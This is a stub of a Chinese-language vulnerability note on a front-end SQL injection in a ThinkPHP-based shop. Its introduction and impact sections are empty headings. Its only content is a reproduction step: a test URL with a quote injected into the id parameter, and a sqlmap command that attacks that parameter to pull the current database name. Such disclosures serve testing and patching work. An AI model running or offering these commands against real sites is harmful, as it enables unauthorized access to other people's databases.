# Thinkphp Shop前台SQL注入

### 一、漏洞简介

### 二、漏洞影响

### 三、复现过程


```
http://url/mobile/index/index2/id/1'

sqlmap -u "http://url/mobile/index/index2/id/1*" --random-agent --batch --dbms "mysql" --current-db
```